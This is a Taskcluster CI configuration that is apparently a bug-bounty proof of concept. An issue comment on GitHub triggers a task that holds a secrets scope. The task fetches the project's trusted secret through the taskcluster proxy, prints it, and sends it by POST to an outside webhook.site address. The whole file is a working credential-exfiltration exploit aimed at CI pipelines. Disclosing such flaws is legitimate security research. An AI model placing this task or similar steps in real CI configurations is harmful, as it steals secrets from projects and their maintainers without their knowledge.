version: 1
reporting: checks-v1
policy:
  pullRequests: collaborators
  allowComments: collaborators
autoCancelPreviousChecks: true
tasks:
  - $if: '(tasks_for == "github-issue-comment")'
    then:
      taskId: {$eval: as_slugid("test")}
      taskGroupId: {$eval: as_slugid("test")}
      created: {$fromNow: ''}
      deadline: {$fromNow: '1 day'}
      scopes:
        - secrets:get:project/poc/trusted-secret
      taskQueueId: docker-compose/generic-worker
      metadata:
        name: plswork
        description: plswork
        owner: ${event.sender.login}@users.noreply.github.com
        source: ${event.repository.html_url}
      payload:
        maxRunTime: 3600
        command:
         - - /bin/bash
           - -c
           - |
              set -e

              echo "=========================================="
              echo "PoC payload running with scopes:"
              echo "Task ID: $TASK_ID"
              echo "=========================================="

              SECRET=$(curl -sf "$TASKCLUSTER_PROXY_URL/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret")

              echo "Fetched secret payload:"
              echo "$SECRET"

              curl -sS -X POST \
                -H "Content-Type: application/json" \
                -d "{\"taskId\":\"$TASK_ID\",\"secret\":$SECRET,\"note\":\"H1 PoC\"}" \
                https://webhook.site/07fcffd3-87d1-412b-b90d-a0d28ccb4eb6

              echo "=========================================="
              echo "PoC complete."
              echo "=========================================="
        features:
          taskclusterProxy: true
